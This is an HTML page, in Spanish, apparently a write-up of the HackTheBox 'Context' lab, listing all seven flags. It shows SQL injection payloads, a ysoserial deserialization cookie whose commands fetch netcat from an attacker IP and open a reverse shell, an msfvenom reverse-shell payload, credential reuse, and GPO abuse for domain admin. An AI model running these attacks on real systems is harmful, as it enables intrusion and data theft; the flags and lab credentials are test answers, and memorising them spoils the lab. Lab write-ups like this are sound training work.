@@ -1,0 +1,452 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Context HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/logc.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Context HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de el Fortress Context de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de el Fortress Context de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Context HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Context HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de el Fortress Context de la plataforma de HackTheBox","headline":"Writeup Context HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Context HackTheBox</h1>
+          <p>Resolución de el Fortress Context de la plataforma de HackTheBox</p>
+        </div>
+
+<div><strong><h3>Flag 1</h3></strong></div>
+<div><strong><h3>CONTEXT{s3cur1ty_thr0ugh_0bscur1ty}</h3></strong></div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.13.37.12
+Nmap scan report for 10.13.37.12
+PORT     STATE SERVICE
+443/tcp  open  https
+1433/tcp open  ms-sql-s
+3389/tcp open  ms-wbt-server</span>
+</code></pre></div></div>
+
+<div><p>Navegando en la página encontramos el directorio <a href="https://10.13.37.12/Home/Staff">/Home/Staff</a> que parece interesante</p></div>
+<div><p>Podemos ver el código cuente con curl y un comentario nos da la flag y credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s -k https://10.13.37.12/Home/Staff | </span><span class="s2">grep</span><span class="p"> \!- -A 3
+&lt!-- TODO: Set up Abbie on the portal, she'll be taking over my duties while
+Karl if I forget to do this, it's </span><span class="kd">jay.teignton:admin</span><span class="p"> for the portal
+</span><span class="kd">CONTEXT{s3cur1ty_thr0ugh_0bscur1ty}</span><span class="p">
+--></span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 2</h3></strong></div>
+<div><strong><h3>CONTEXT{d0_it_st0p_it_br34k_it_f1x_it}</h3></strong></div>
+
+<div><p>Podemos usar las credenciales que encontramos en el login de <a href="https://10.13.37.12/Admin">/Admin</a></p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Una vez iniciamos sesión podemos ver lo siguiente</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>También tenemos un campo de productos donde podemos intentar hacer una inyección sql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'+(select db_name())+'</span></code></pre></div></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Mirando la respuesta podemos ver que aplica y muestra el nombre de la base de datos</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Seguimos enumerando la base de datos y encontramos la tabla users</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'+(select name from webapp..sysobjects where xtype = 'U' order by name offset 1 rows fetch next 1 rows only)+'</span></code></pre></div></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Si dumpeamos el campo username podemos ver un usuario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'+(select top 1 username from users order by username)+'</span></code></pre></div></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Lo mismo para el campo password ahora tenemos credenciales válidas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'+(select top 1 password from users order by username)+'</span></code></pre></div></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Después de obtener las credenciales también podemos ver la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'+(select password from users order by username offset 2 rows fetch next 1 rows only)+'</span></code></pre></div></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><strong><h3>Flag 3</h3></strong></div>
+<div><strong><h3>CONTEXT{wh00000_4re_y0u?}</h3></strong></div>
+
+<div><p>Tenemos el ususario "abbie.buckfast" y la contraseña "AMkru$3_f'/Q^7f?"</a></p></div>
+<div><p>Podemos usarlas en <a href="https://10.13.37.12/owa">/owa</a> que parece ser un servicio de outlook</p></div>
+<div><p><img src="./9.png"><p></div>
+
+<div><p>Después de iniciar sesión interesantemente podemos cambiar a otro buzón</p></div>
+<div><p><img src="./10.png"><p></div>
+
+<div><p>Basta con poner un par de letras y un autocompletador nos muestra un usuario</p></div>
+<div><p><img src="./11.png"><p></div>
+
+<div><p>Damos enter y nos da la opción de abrir su buzón sin proporcionar otra contraseña</p></div>
+<div><p><img src="./12.png"><p></div>
+
+<div><p>Al abrir el buzón y mirar mensajes enviados podemos encontrar la flag</p></div>
+<div><p><img src="./13.png"><p></div>
+
+<div><strong><h3>Flag 4</h3></strong></div>
+<div><strong><h3>CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}</h3></strong></div>
+
+<div><p>Además en inbox podemos ver un mensaje y un zip que podemos descargar</p></div>
+<div><p><img src="./14.png"><p></div>
+
+<div><p>Después de descargar y unzipear el archivo en una carpeta podemos ver un _ViewStart.cshtml</p></div>
+<div><p>Analizando el contenido podemos pensar en un ataque de deseralización en la cookie Profile</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">WebApplication/Views </span><span class="s2">❯ cat</span><span class="p"> _ViewStart.cshtml
+@{
+    </span><span class="k">Layout </span><span class="kd">=</span><span class="s2"> "~/Views/Shared/_Layout.cshtml"</span><span class="p">;
+}
+
+@using </span><span class="k">System</span><span class="p">.</span><span class="k">Text</span><span class="p">;
+@using </span><span class="k">System</span><span class="p">.</span><span class="k">Web</span><span class="p">.</span><span class="k">Script</span><span class="p">.</span><span class="k">Serialization</span><span class="p">;
+@{ 
+    </span><span class="kd">if</span><span class="p"> (</span><span class="na">0 </span><span class="kd">!=</span><span class="k"> Context</span><span class="p">.</span><span class="k">Session</span><span class="p">.</span><span class="k">Keys</span><span class="p">.</span><span class="k">Count</span><span class="p">) {
+        </span><span class="kd">if</span><span class="p"> (</span><span class="na">null</span><span class="kd"> != </span><span class="k">Context</span><span class="p">.</span><span class="k">Request</span><span class="p">.</span><span class="k">Cookies</span><span class="p">.</span><span class="k">Get</span><span class="p">(</span><span class="s2">"Profile"</span><span class="p">)) {
+            </span><span class="kd">try</span><span class="p"> {
+                </span><span class="no">byte</span><span class="kd">[] </span><span class="p">data </span><span class="kd">=</span><span class="k"> Convert</span><span class="p">.</span><span class="k">FromBase64String</span><span class="p">(</span><span class="k">Context</span><span class="p">.</span><span class="k">Request</span><span class="p">.</span><span class="k">Cookies</span><span class="p">.</span><span class="k">Get</span><span class="p">(</span><span class="s2">"Profile"</span><span class="p">)</span><span class="kd">?</span><span class="p">.</span><span class="k">Value</span><span class="p">);
+                string str </span><span class="kd">=</span><span class="k"> UTF8Encoding</span><span class="p">.</span><span class="na">UTF8</span><span class="p">.GetString(data);
+
+                </span><span class="k">SimpleTypeResolver </span><span class="p">resolver </span><span class="kd">= new</span><span class="k"> SimpleTypeResolver</span><span class="p">();
+                </span><span class="k">JavaScriptSerializer </span><span class="p">serializer </span><span class="kd">= new</span><span class="k"> JavaScriptSerializer</span><span class="p">(resolver);
+
+                object obj </span><span class="kd">=</span><span class="p"> (</span><span class="k">serializer</span><span class="p">.</span><span class="k">Deserialize</span><span class="p">(str, typeof(object)) as </span><span class="k">Profile</span><span class="p">);
+</span><span class="c1">                // TODO: create profile to change the language and font of the website </span><span class="p">
+            } </span><span class="kd">catch </span><span class="p">(</span><span class="k">Exception</span><span class="no"> e</span><span class="p">) {
+            }
+        }
+    }
+}</span>
+</code></pre></div></div>
+
+<div><p>Con ayuda de <a href="https://github.com/pwntester/ysoserial.net">ysoserial</a> crearemos una data serializada que nos descargue el netcat.exe</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">pc1@windows C:\CTF\ysoserial> </span><span class="no">.\ysoserial.exe </span><span class="c1">-f</span><span class="p"> JavaScriptSerializer </span><span class="c1">-o</span><span class="p"> base64 </span><span class="c1">-g</span><span class="p"> ObjectDataProvider </span><span class="c1">-c</span><span class="na"> "cmd /c curl 10.13.14.10/netcat.exe -o C:\ProgramData\netcat.exe"</span><span class="p">
+ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgY3VybCAxMC4xMy4xNC4xMC9uZXRjYXQuZXhlIC1vIEM6XFxQcm9ncmFtRGF0YVxcbmV0Y2F0LmV4ZScNCiAgICAgICAgfQ0KICAgIH0NCn0=
+pc1@windows C:\CTF\ysoserial></span>
+</code></pre></div></div>
+
+<div><p>Iniciamos sesión de nuevo en /Admin y creamos una cookie Profile con la data serializada</p></div>
+<div><p><img src="./15.png"><p></div>
+
+<div><p>Guardamos la cookie y al recargar no llega la petición de descarga de netcat</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.13.37.12 - - "GET /netcat.exe HTTP/1.1" 200 -</span>
+</code></pre></div></div>
+
+<div><p>Ahora creamos una data para invocar el netcat y enviarnos una reverse shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">pc1@windows C:\CTF\ysoserial> </span><span class="no">.\ysoserial.exe </span><span class="c1">-f</span><span class="p"> JavaScriptSerializer </span><span class="c1">-o</span><span class="p"> base64 </span><span class="c1">-g</span><span class="p"> ObjectDataProvider </span><span class="c1">-c</span><span class="na"> "cmd /c C:\ProgramData\netcat.exe -e powershell 10.13.14.10 443"</span><span class="p">
+ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgQzpcXFByb2dyYW1EYXRhXFxuZXRjYXQuZXhlIC1lIHBvd2Vyc2hlbGwgMTAuMTMuMTQuMTAgNDQzJw0KICAgICAgICB9DQogICAgfQ0KfQ==
+pc1@Windows C:\CTF\ysoserial></span>
+</code></pre></div></div>
+
+<div><p>Cambiamos la cookie y al recargar esta vez nos llega una shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.37.12
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Windows\system32> </span><span class="no">whoami</span><span class="p">
+teignton\web_user
+PS C:\Windows\system32> </span><span class="no">type C:\Users\Public\flag.txt</span><span class="p">
+</span><span class="kd">CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}</span><span class="p">
+PS C:\Windows\system32></span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 5</h3></strong></div>
+<div><strong><h3>CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}</h3></strong></div>
+
+<div><p>Mirando los logs de webdb podemos encontrar unas credenciales en texto claro</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Logs\WEBDB> </span><span class="no">type log_13.trc | Select-String TEIGNTON</span><span class="p">
+????????? ??? ?????? ?????????? ??????? </span><span class="kd">TEIGNTON\karl.memaybe</span><span class="p">
+????????? ??? ?????? ?????????? ??????? </span><span class="kd">B6rQx_d&RVqvcv2A</span><span class="p">
+PS C:\Logs\WEBDB></span>
+</code></pre></div></div>
+
+<div><p>Si probamos conectarnos con sqsh a mssql con las credenciales, nos podemos conectar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqsh</span><span class="p"> -S 10.13.37.12:1433 -U teignton\\karl.memaybe -P </span><span class="no">'B6rQx_d&RVqvcv2A'</span><span class="p">
+Copyright (C) 1995-2001 Scott C. Gray
+1></span>
+</code></pre></div></div>
+
+<div><p>Si enumeramos un poco podemos ver la base de datos clients</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">1></span><span class="p"> select * from openquery("web\clients", 'select name from master..sysdatabases');
+</span><span class="kd">2></span><span class="p"> go
+master
+tempdb
+model
+msdb
+clients
+(5 rows affected)
+</span><span class="kd">1></span>
+</code></pre></div></div>
+
+<div><p>Enumerando un poco mas la base de datos podemos encontrar card_details</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">1></span><span class="p"> select * from openquery("web\clients", 'select name from clients..sysobjects');
+</span><span class="kd">2></span><span class="p"> go
+BackupClients
+card_details
+QueryNotificationErrorsQueue
+queue_messages_1977058079
+EventNotificationErrorsQueue
+queue_messages_2009058193
+ServiceBrokerQueue
+queue_messages_2041058307
+(8 rows affected)
+</span><span class="kd">1></span>
+</code></pre></div></div>
+
+<div><p>Si enviamos su contenido a un txt y despues lo cateamos podemos ver la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">1></span><span class="p"> select * from openquery("web\clients", 'select * from clients..card_details');
+</span><span class="kd">2></span><span class="p"> go > out.txt
+</span><span class="kd">1></span><span class="p"> exit
+</span><span class="s2">❯ cat </span><span class="p">out.txt | </span><span class="s2">grep</span><span class="p"> CONTEXT
+</span><span class="kd">CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 6</h3></strong></div>
+<div><strong><h3>CONTEXT{l0l_s0c3ts_4re_fun}</h3></strong></div>
+
+<div><p>También encontramos un binario que despues de bajarlo podemos ver que es un dll</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">1></span><span class="p"> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
+</span><span class="kd">2></span><span class="p"> go > text
+</span><span class="kd">1></span><span class="p"> exit
+</span><span class="s2">❯ cat </span><span class="p">text | </span><span class="s2">base64</span><span class="p"> -d > out
+</span><span class="s2">❯ file </span><span class="p">out
+out: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows</span>
+</code></pre></div></div>
+
+<div><p>Revisando con ayuda de <a href="">dnSpy</a> las funciones podemos ver BackupClients</p></div>
+<div><p><img src="./16.png"><p></div>
+
+<div><p>Dentro de ella podemos ver credenciales entonces simplemente nos conectamos</p></div>
+<div><p><img src="./17.png"><p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ evil-winrm</span><span class="p"> -i 10.13.37.12 -u jay.teignton -p </span><span class="no">'D0ntL0seSk3l3tonK3y!'</span><span class="p">
+PS C:\Users\jay.teignton\Documents> </span><span class="no">whoami</span><span class="p">
+teignton\jay.teignton
+PS C:\Users\jay.teignton\Documents></span>
+</code></pre></div></div>
+
+<div><p>Podemos ver un archivo .exe que si vemos su contenido podemos encontrar la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\jay.teignton\Documents> </span><span class="no">dir</span><span class="p">
+
+    Directory: C:\Users\jay.teignton\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        10/7/2020  10:31 PM          11264 WindowsService.exe
+
+PS C:\Users\jay.teignton\Documents> </span><span class="no">Select-String CONTEXT WindowsService.exe</span><span class="p">
+2020)$46c273c4-b625-4cae-bba3-79fb0d3406bc
+1.0.0.0M.NETFramework,Version=v4.7.2TFrameworkDisplayName.NET Framework
+?A_CorExeMainmscoree.dllÿ% @</span><span class="kd">CONTEXT{l0l_s0c3ts_4re_fun}</span><span class="p">
+€P€8€€h€Ü�Comments"CompanyNameFFileDescriptionWindowsServiceFileVer
+sion1.0.0.0FInternalNameWindowsService.exeHLegalCopyrightCopyright ©
+PS C:\Users\jay.teignton\Documents></span>
+</code></pre></div></div>
+
+
+<div><strong><h3>Flag 7</h3></strong></div>
+<div><strong><h3>CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}</h3></strong></div>
+
+<div><p>Hay un servicio corriendo en el puerto 7734 al que podemos conectarnos con netcat</p></div>
+
+<div><p>Analizando el .exe con dnSpy podemos ver TCPServer con algunas cosas</p></div>
+<div><p><img src="./18.png"><p></div>
+
+<div><p>Podemos ver que la contraseña se compone por la fecha mas la cadena "-thisisleet"</p></div>
+<div><p><img src="./19.png"><p></div>
+
+<div><p>Podemos comprobarlo con el parametro password que se nos indica en la función</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="no">date</span><span class="p">
+30 July 2022 01:26:14
+PS C:\ProgramData> </span><span class="no">.\netcat.exe 127.0.0.1 7734 -v</span><span class="p">
+netcat.exe : WEB.TEIGNTON.HTB [127.0.0.1] 7734 (?) open
+password=2022-07-30-thisisleet
+OK</span>
+</code></pre></div></div>
+
+<div><p>Además de password vemos un parámetro command donde podemos ejecutar un binario</p></div>
+<div><p><img src="./20.png"><p></div>
+
+<div><p>Sabiendo esto creamos un payload con msfvenom y montamos un servicio http</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ msfvenom</span><span class="p"> -p windows/x64/shell_reverse_tcp LHOST=10.13.14.10 LPORT=443 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe
+</span><span class="s2">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div>
+
+<div><p>Descargamos el .exe, nos conectamos al servicio, y despues de dar la contraseña lo invocamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="no">curl 10.13.14.10/shell.exe -o shell.exe</span><span class="p">
+PS C:\ProgramData> </span><span class="no">.\netcat.exe 127.0.0.1 7734 -v</span><span class="p">
+netcat.exe : WEB.TEIGNTON.HTB [127.0.0.1] 7734 (?) open
+password=2022-07-30-thisisleet
+OK
+command=c:\programdata\shell.exe
+CONTEXT{l0l_s0c3ts_4re_fun}
+PS C:\ProgramData></span>
+</code></pre></div></div>
+
+<div><p>Si miramos el listener deberiamos haber recibido una shell como otro usuario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.37.12
+Microsoft Windows [Version 10.0.17763.1490]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows\system32> </span><span class="no">powershell</span><span class="p">
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Windows\system32> </span><span class="no">whoami</span><span class="p">
+teignton\andy.teignton
+PS C:\Windows\system32></span>
+</code></pre></div></div>
+
+<div><p>Jungando con bloodhound encontramos una ruta para elevar nuestro privilegio</p></div>
+<div><p>Para eso lo explotaremos de la siguiente manera con ayuda de <a href="https://github.com/byronkg/SharpGPOAbuse">SharpGPOAbuse</a></p></div>
+<div><p>Iniciamos creando un nuevo GPO y un GPLink, con cualquier nombre en este caso privesc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="no">New-GPO -Name privesc -Comment "Privilege Escalation"</span><span class="p">
+
+DisplayName      : privesc
+DomainName       : TEIGNTON.HTB
+Owner            : TEIGNTON\andy.teignton
+Id               : d5ea7314-db30-4c0d-89a4-9f7db3c48517
+GpoStatus        : AllSettingsEnabled
+Description      : Privilege Escalation
+CreationTime     : 30/07/2022 01:43:00
+ModificationTime : 30/07/2022 01:43:00
+UserVersion      : AD Version: 0, SysVol Version: 0
+ComputerVersion  : AD Version: 0, SysVol Version: 0
+WmiFilter        : 
+
+PS C:\ProgramData> </span><span class="no">New-GPLink -Name privesc -Target "OU=Domain Controllers,DC=TEIGNTON,DC=HTB" -LinkEnabled Yes</span><span class="p">
+
+GpoId       : d5ea7314-db30-4c0d-89a4-9f7db3c48517
+DisplayName : privesc
+Enabled     : True
+Enforced    : False
+Target      : OU=Domain Controllers,DC=TEIGNTON,DC=HTB
+Order       : 2
+
+PS C:\ProgramData></span>
+</code></pre></div></div>
+
+<div><p>Ahora con ayuda de SharpGPOAbuse agregamos a jay.teignton a Administradores</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="no">.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jay.teignton --gponame privesc</span><span class="p">
+[+] Domain = teignton.htb
+[+] Domain Controller = WEB.TEIGNTON.HTB
+[+] Distinguished Name = CN=Policies,CN=System,DC=TEIGNTON,DC=HTB
+[+] SID Value of jay.teignton = S-1-5-21-3174020193-2022906219-3623556448-1103
+[+] GUID of "privesc" is: {D5EA7314-DB30-4C0D-89A4-9F7DB3C48517}
+[+] Creating file \\teignton.htb\SysVol\teignton.htb\Policies\{D5EA7314-DB30-4C0D-89A4-9F7DB3C48517}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+PS C:\ProgramData></span>
+</code></pre></div></div>
+
+<div><p>Actualizamos la configuración y al conectarnos ahora estamos en el grupo Administrators</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="no">gpupdate /force</span><span class="p">
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+
+PS C:\ProgramData></span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ evil-winrm </span><span class="p">-i 10.13.37.12 -u jay.teignton -p </span><span class="no">'D0ntL0seSk3l3tonK3y!'</span><span class="p">
+PS C:\Users\jay.teignton\Documents> </span><span class="no">net user jay.teignton | Select-String Group</span><span class="p">
+
+Local Group Memberships      *Administrators       *Remote Desktop Users
+Global Group memberships     *Domain Users
+
+PS C:\Users\jay.teignton\Documents></span>
+</code></pre></div></div>
+
+<div><p>En este punto nos dirigimos al directorio Administrator y podemos leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\jay.teignton\Documents> </span><span class="no">cd C:\Users\Administrator\Documents</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="no">dir</span><span class="p">
+
+    Directory: C:\Users\Administrator\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/12/2020   5:53 PM                SQL Server Management Studio
+d-----       10/12/2020   6:53 PM                Visual Studio 2017
+-a----        7/15/2020   8:15 PM             34 flag.txt
+-a----        7/29/2020  12:28 PM            188 info.txt
+
+PS C:\Users\Administrator\Documents> </span><span class="no">type flag.txt
+</span><span class="kd">CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}</span><span class="p">
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
